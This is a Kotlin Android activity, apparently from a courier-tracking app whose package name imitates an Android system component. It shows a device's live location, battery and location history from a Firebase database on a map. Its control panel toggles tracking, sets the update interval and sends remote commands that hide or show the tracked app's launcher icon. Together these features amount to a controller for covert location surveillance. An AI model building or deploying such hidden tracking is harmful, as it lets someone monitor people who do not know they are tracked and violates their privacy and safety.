package com.android.system.manager

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.ui.zIndex
import com.google.android.gms.maps.CameraUpdateFactory
import com.google.android.gms.maps.GoogleMap
import com.google.android.gms.maps.MapView
import com.google.android.gms.maps.model.*
import com.google.firebase.database.*
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

@AndroidEntryPoint
class CourierDetailActivity : ComponentActivity() {
    
    private lateinit var mapView: MapView
    private lateinit var googleMap: GoogleMap
    private lateinit var historyRef: DatabaseReference
    private lateinit var devicesRef: DatabaseReference
    private val historyMarkers = mutableMapOf<String, Marker>()
    private var polyline: Polyline? = null
    
    data class LocationHistory(
        val lat: Double = 0.0,
        val lng: Double = 0.0,
        val bearing: Double = 0.0,
        val timestamp: Long = 0L,
        val method: String = "",
        val isMocked: Boolean = false,
        val isAnomaly: Boolean = false
    )
    
    data class DeviceData(
        val lat: Double = 0.0,
        val lng: Double = 0.0,
        val accuracy: Float = 0f,
        val speed: Double = 0.0,
        val bearing: Double = 0.0,
        val altitude: Double = 0.0,
        val provider: String = "",
        val battery: Int = 0,
        val timestamp: Long = 0L,
        val isOnline: Boolean = false,
        val deviceId: String = "",
        val deviceName: String = "",
        val email: String = "",
        val status: String = "",
        val commands: Map<String, Any>? = null
    )
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val deviceId = intent.getStringExtra("device_id") ?: ""
        val deviceName = intent.getStringExtra("device_name") ?: "Unknown Device"
        
        devicesRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app").getReference("devices")
        historyRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app").getReference("location_history").child(deviceId)
        
        setContent {
            CourierDetailScreen(deviceId = deviceId, deviceName = deviceName)
        }
        
        // Initialize MapView
        mapView = MapView(this)
        mapView.onCreate(Bundle())
        mapView.getMapAsync { map ->
            googleMap = map
            setupMap()
        }
    }
    
    @Composable
    private fun CourierDetailScreen(deviceId: String, deviceName: String) {
        var deviceData by remember { mutableStateOf<DeviceData?>(null) }
        var locationHistory by remember { mutableStateOf<List<LocationHistory>>(emptyList()) }
        var isLoading by remember { mutableStateOf(true) }
        var scope = rememberCoroutineScope()
        
        // Device control state
        var trackingEnabled by remember { mutableStateOf(true) }
        var intervalSeconds by remember { mutableStateOf(30) }
        var controlMessage by remember { mutableStateOf("") }
        var showControlPanel by remember { mutableStateOf(false) }
        var isLauncherHidden by remember { mutableStateOf(false) }
        
        // Apply tracking config changes
        fun applyTrackingConfig() {
            val trackingConfig = mapOf(
                "trackingEnabled" to trackingEnabled,
                "intervalSeconds" to intervalSeconds.toLong()
            )
            
            devicesRef.child(deviceId).child("trackingConfig")
                .updateChildren(trackingConfig)
                .addOnSuccessListener {
                    controlMessage = "Settings applied successfully"
                    Log.d("DEBUG_DETAIL", "Tracking config updated: $trackingConfig")
                    // Clear message after 3 seconds
                    scope.launch {
                        kotlinx.coroutines.delay(3000)
                        controlMessage = ""
                    }
                }
                .addOnFailureListener { error ->
                    controlMessage = "Error: ${error.message}"
                    Log.e("DEBUG_DETAIL", "Failed to update tracking config: ${error.message}")
                    // Clear message after 3 seconds
                    scope.launch {
                        kotlinx.coroutines.delay(3000)
                        controlMessage = ""
                    }
                }
        }
        
        // Hide launcher command
        fun hideLauncherCommand() {
            val command = mapOf("hideLauncher" to true)
            
            devicesRef.child(deviceId).child("commands")
                .updateChildren(command)
                .addOnSuccessListener {
                    isLauncherHidden = true
                    controlMessage = "Hide launcher command sent"
                    Log.d("DEBUG_DETAIL", "Hide launcher command sent to device: $deviceId")
                    // Clear message after 3 seconds
                    scope.launch {
                        kotlinx.coroutines.delay(3000)
                        controlMessage = ""
                    }
                }
                .addOnFailureListener { error ->
                    controlMessage = "Error: ${error.message}"
                    Log.e("DEBUG_DETAIL", "Failed to send hide launcher command: ${error.message}")
                    // Clear message after 3 seconds
                    scope.launch {
                        kotlinx.coroutines.delay(3000)
                        controlMessage = ""
                    }
                }
        }
        
        // Show launcher command
        fun showLauncherCommand() {
            val command = mapOf("showLauncher" to true)
            
            devicesRef.child(deviceId).child("commands")
                .updateChildren(command)
                .addOnSuccessListener {
                    isLauncherHidden = false
                    controlMessage = "Show launcher command sent"
                    Log.d("DEBUG_DETAIL", "Show launcher command sent to device: $deviceId")
                    // Clear message after 3 seconds
                    scope.launch {
                        kotlinx.coroutines.delay(3000)
                        controlMessage = ""
                    }
                }
                .addOnFailureListener { error ->
                    controlMessage = "Error: ${error.message}"
                    Log.e("DEBUG_DETAIL", "Failed to send show launcher command: ${error.message}")
                    // Clear message after 3 seconds
                    scope.launch {
                        kotlinx.coroutines.delay(3000)
                        controlMessage = ""
                    }
                }
        }
        
        // Listen for device data updates
        LaunchedEffect(deviceId) {
            val deviceListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    deviceData = snapshot.getValue(DeviceData::class.java)
                    Log.d("DEBUG_DETAIL", "Device data updated: ${deviceData?.deviceName}")
                }
                
                override fun onCancelled(error: DatabaseError) {
                    Log.e("DEBUG_DETAIL", "Device listener cancelled: ${error.message}")
                }
            }
            
            devicesRef.child(deviceId).addValueEventListener(deviceListener)
        }
        
        // Listen for location history
        LaunchedEffect(deviceId) {
            isLoading = true
            historyRef.limitToLast(50).get().addOnSuccessListener { snapshot ->
                val history = mutableListOf<LocationHistory>()
                snapshot.children.forEach { child ->
                    val location = child.getValue(LocationHistory::class.java)
                    if (location != null) {
                        history.add(location)
                    }
                }
                locationHistory = history.sortedBy { it.timestamp }
                isLoading = false
                
                // Update map with history
                scope.launch {
                    updateMapWithHistory(locationHistory, deviceData)
                }
                
                Log.d("DEBUG_DETAIL", "Location history loaded: ${history.size} points")
            }.addOnFailureListener { error ->
                Log.e("DEBUG_DETAIL", "Failed to load history: ${error.message}")
                isLoading = false
            }
            
            // Load current tracking config
            devicesRef.child(deviceId).child("trackingConfig").get().addOnSuccessListener { snapshot ->
                trackingEnabled = snapshot.child("trackingEnabled").getValue(Boolean::class.java) ?: true
                intervalSeconds = snapshot.child("intervalSeconds").getValue(Long::class.java)?.toInt() ?: 30
                Log.d("DEBUG_DETAIL", "Tracking config loaded: enabled=$trackingEnabled, interval=$intervalSeconds")
            }.addOnFailureListener { error ->
                Log.e("DEBUG_DETAIL", "Failed to load tracking config: ${error.message}")
            }
        }
        
        Box(modifier = Modifier.fillMaxSize()) {
            // Map View
            AndroidView(
                factory = { context -> mapView },
                modifier = Modifier.fillMaxSize()
            )
            
            // Top Bar
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp)
                    .align(Alignment.TopStart),
                elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
            ) {
                Column(
                    modifier = Modifier.padding(16.dp)
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween,
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            IconButton(onClick = { finish() }) {
                                Icon(Icons.Default.ArrowBack, contentDescription = "Back")
                            }
                            Spacer(modifier = Modifier.width(8.dp))
                            Column {
                                Text(
                                    text = deviceName,
                                    style = MaterialTheme.typography.titleMedium,
                                    fontWeight = FontWeight.Bold
                                )
                                Text(
                                    text = if (deviceData?.isOnline == true) "Online" else "Offline",
                                    fontSize = 12.sp,
                                    color = if (deviceData?.isOnline == true) Color.Green else Color.Red
                                )
                            }
                        }
                        
                        if (isLoading) {
                            CircularProgressIndicator(
                                modifier = Modifier.size(24.dp),
                                strokeWidth = 2.dp
                            )
                        }
                    }
                    
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    deviceData?.let { device ->
                        DeviceInfoGrid(device)
                    }
                }
            }
            
            // Device Control Section (conditional)
            if (showControlPanel) {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 16.dp, vertical = 8.dp)
                        .align(Alignment.CenterStart),
                    elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
                ) {
                    DeviceControlSection(
                        trackingEnabled = trackingEnabled,
                        intervalSeconds = intervalSeconds,
                        onTrackingEnabledChange = { trackingEnabled = it },
                        onIntervalChange = { intervalSeconds = it },
                        onApply = { applyTrackingConfig() },
                        isLauncherHidden = isLauncherHidden,
                        onHideLauncher = { hideLauncherCommand() },
                        onShowLauncher = { showLauncherCommand() },
                        message = controlMessage
                    )
                }
            }
            
            // Location History List
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(200.dp)
                    .padding(16.dp)
                    .align(Alignment.BottomStart),
                elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
            ) {
                LocationHistoryList(history = locationHistory)
            }
            
            // Floating Settings Button (top-right corner, LAST composable for highest z-index)
            IconButton(
                onClick = { showControlPanel = !showControlPanel },
                modifier = Modifier
                    .align(Alignment.TopEnd)
                    .padding(top = 80.dp, end = 16.dp)
                    .zIndex(10f)
                    .background(
                        color = MaterialTheme.colorScheme.surface,
                        shape = CircleShape
                    )
            ) {
                Icon(
                    imageVector = if (showControlPanel) Icons.Default.Close else Icons.Default.Settings,
                    contentDescription = if (showControlPanel) "Hide Control Panel" else "Show Control Panel",
                    tint = MaterialTheme.colorScheme.onSurface
                )
            }
        }
    }
    
    @Composable
    private fun DeviceInfoGrid(device: DeviceData) {
        Column {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                InfoItem("Battery", "${device.battery}%", Icons.Filled.Settings)
                InfoItem("Speed", "${device.speed.toInt()} km/h", Icons.Filled.LocationOn)
                InfoItem("Provider", device.provider.uppercase(), Icons.Filled.LocationOn)
            }
            
            Spacer(modifier = Modifier.height(8.dp))
            
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                InfoItem("Accuracy", "${device.accuracy}m", Icons.Filled.LocationOn)
                InfoItem("Lat", "%.6f".format(device.lat), Icons.Filled.LocationOn)
                InfoItem("Lng", "%.6f".format(device.lng), Icons.Filled.LocationOn)
            }
        }
    }
    
    @Composable
    private fun InfoItem(label: String, value: String, icon: androidx.compose.ui.graphics.vector.ImageVector) {
        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            modifier = Modifier.padding(4.dp)
        ) {
            Icon(
                icon,
                contentDescription = null,
                modifier = Modifier.size(20.dp),
                tint = MaterialTheme.colorScheme.primary
            )
            Text(
                text = value,
                fontSize = 12.sp,
                fontWeight = FontWeight.Bold
            )
            Text(
                text = label,
                fontSize = 10.sp,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
        }
    }
    
    @Composable
    private fun DeviceControlSection(
        trackingEnabled: Boolean,
        intervalSeconds: Int,
        onTrackingEnabledChange: (Boolean) -> Unit,
        onIntervalChange: (Int) -> Unit,
        onApply: () -> Unit,
        isLauncherHidden: Boolean,
        onHideLauncher: () -> Unit,
        onShowLauncher: () -> Unit,
        message: String
    ) {
        Column(
            modifier = Modifier.padding(16.dp)
        ) {
            Text(
                text = "Device Control",
                style = MaterialTheme.typography.titleSmall,
                fontWeight = FontWeight.Bold,
                modifier = Modifier.padding(bottom = 12.dp)
            )
            
            // Tracking toggle row
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = "Tracking",
                    style = MaterialTheme.typography.bodyMedium
                )
                Switch(
                    checked = trackingEnabled,
                    onCheckedChange = onTrackingEnabledChange
                )
            }
            
            Spacer(modifier = Modifier.height(12.dp))
            
            // Update interval row
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = "Update Interval",
                    style = MaterialTheme.typography.bodyMedium
                )
                Row(
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Slider(
                        value = intervalSeconds.toFloat(),
                        onValueChange = { onIntervalChange(it.toInt()) },
                        valueRange = 10f..300f,
                        steps = (300 - 10) / 10,
                        modifier = Modifier.width(120.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "${intervalSeconds}s",
                        style = MaterialTheme.typography.bodySmall,
                        fontWeight = FontWeight.Bold
                    )
                }
            }
            
            Spacer(modifier = Modifier.height(12.dp))
            
            // Hide/Show Launcher button (toggle)
            Button(
                onClick = { 
                    if (isLauncherHidden) {
                        onShowLauncher()
                    } else {
                        onHideLauncher()
                    }
                },
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(top = 10.dp)
                    .zIndex(11f),
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (isLauncherHidden) Color.Green else Color.Red,
                    contentColor = Color.White
                )
            ) {
                Text(if (isLauncherHidden) "Show Launcher" else "Hide Launcher")
            }
            
            Spacer(modifier = Modifier.height(8.dp))
            
            // Apply button
            Button(
                onClick = onApply,
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("Apply")
            }
            
            // Message display
            if (message.isNotEmpty()) {
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = message,
                    style = MaterialTheme.typography.bodySmall,
                    color = if (message.contains("Error")) Color.Red else Color.Green
                )
            }
        }
    }
    
    @Composable
    private fun LocationHistoryList(history: List<LocationHistory>) {
        Column(modifier = Modifier.fillMaxSize()) {
            Text(
                text = "Location History (Last 50 points)",
                style = MaterialTheme.typography.titleSmall,
                fontWeight = FontWeight.Bold,
                modifier = Modifier.padding(16.dp)
            )
            
            LazyColumn(modifier = Modifier.weight(1f)) {
                items(history.reversed()) { location ->
                    HistoryItem(location = location)
                }
            }
        }
    }
    
    @Composable
    private fun HistoryItem(location: LocationHistory) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 16.dp, vertical = 4.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column {
                Text(
                    text = "${location.method.uppercase()}",
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Medium
                )
                Text(
                    text = "Lat: ${location.lat}, Lng: ${location.lng}",
                    fontSize = 10.sp,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
            }
            
            Column(horizontalAlignment = Alignment.End) {
                Text(
                    text = getRelativeTime(location.timestamp),
                    fontSize = 10.sp,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
                if (location.isAnomaly) {
                    Text(
                        text = "⚠️ Anomaly",
                        fontSize = 8.sp,
                        color = Color(0xFFFF9800) // Orange
                    )
                }
                if (location.isMocked) {
                    Text(
                        text = "🔄 Mocked",
                        fontSize = 8.sp,
                        color = Color.Red
                    )
                }
            }
        }
    }
    
    private fun setupMap() {
        googleMap.apply {
            uiSettings.isZoomControlsEnabled = true
            uiSettings.isCompassEnabled = true
            
            // Set map style for better visibility
            setMapStyle(MapStyleOptions("{\"styles\":[{\"featureType\":\"all\",\"elementType\":\"geometry\",\"stylers\":[{\"color\":\"#242f3e\"}]},{\"featureType\":\"all\",\"elementType\":\"labels.text.stroke\",\"stylers\":[{\"color\":\"#242f3e\"}]},{\"featureType\":\"all\",\"elementType\":\"labels.text.fill\",\"stylers\":[{\"color\":\"#746855\"}]},{\"featureType\":\"water\",\"elementType\":\"geometry\",\"stylers\":[{\"color\":\"#17263c\"}]}]}"))
        }
    }
    
    private fun updateMapWithHistory(history: List<LocationHistory>, deviceData: DeviceData?) {
        // Clear existing markers and polyline
        historyMarkers.values.forEach { it.remove() }
        historyMarkers.clear()
        polyline?.remove()
        
        if (history.isEmpty()) return
        
        // Create polyline options
        val polylineOptions = PolylineOptions()
            .color(Color.Blue.hashCode())
            .width(5f)
            .geodesic(true)
        
        // Add points to polyline and create markers for key points
        history.forEachIndexed { index, location ->
            val latLng = LatLng(location.lat, location.lng)
            polylineOptions.add(latLng)
            
            // Add marker for every 10th point or anomalous points
            if (index % 10 == 0 || location.isAnomaly || location.isMocked) {
                val markerOptions = MarkerOptions()
                    .position(latLng)
                    .title("Point ${index + 1}")
                    .snippet("${getRelativeTime(location.timestamp)} - ${location.method}")
                    .icon(getHistoryMarkerIcon(location))
                
                val marker = googleMap.addMarker(markerOptions)
                marker?.tag = "history_$index"
                if (marker != null) {
                    historyMarkers["history_$index"] = marker
                }
            }
        }
        
        // Add polyline to map
        polyline = googleMap.addPolyline(polylineOptions)
        
        // Center map on the history path
        if (history.isNotEmpty()) {
            val boundsBuilder = LatLngBounds.Builder()
            history.forEach { location ->
                boundsBuilder.include(LatLng(location.lat, location.lng))
            }
            
            // Also include current device location if available
            deviceData?.let { device ->
                if (device.lat != 0.0 && device.lng != 0.0) {
                    boundsBuilder.include(LatLng(device.lat, device.lng))
                    
                    // Add current location marker
                    val currentMarker = MarkerOptions()
                        .position(LatLng(device.lat, device.lng))
                        .title("Current Location")
                        .snippet("Battery: ${device.battery}% | Provider: ${device.provider}")
                        .icon(BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_GREEN))
                    
                    googleMap.addMarker(currentMarker)
                }
            }
            
            val bounds = boundsBuilder.build()
            val cameraUpdate = CameraUpdateFactory.newLatLngBounds(bounds, 100)
            googleMap.animateCamera(cameraUpdate)
        }
        
        Log.d("DEBUG_DETAIL", "Map updated with ${history.size} history points")
    }
    
    private fun getHistoryMarkerIcon(location: LocationHistory): BitmapDescriptor {
        return when {
            location.isMocked -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_RED)
            location.isAnomaly -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_ORANGE)
            else -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_BLUE)
        }
    }
    
    private fun getRelativeTime(timestamp: Long): String {
        val now = System.currentTimeMillis()
        val diff = now - timestamp
        
        return when {
            diff < TimeUnit.MINUTES.toMillis(1) -> "Just now"
            diff < TimeUnit.MINUTES.toMillis(60) -> "${diff / TimeUnit.MINUTES.toMillis(1)} min ago"
            diff < TimeUnit.HOURS.toMillis(24) -> "${diff / TimeUnit.HOURS.toMillis(1)} hours ago"
            else -> "${diff / TimeUnit.DAYS.toMillis(1)} days ago"
        }
    }
    
    override fun onResume() {
        super.onResume()
        mapView.onResume()
    }
    
    override fun onPause() {
        super.onPause()
        mapView.onPause()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        mapView.onDestroy()
    }
    
    override fun onLowMemory() {
        super.onLowMemory()
        mapView.onLowMemory()
    }
}
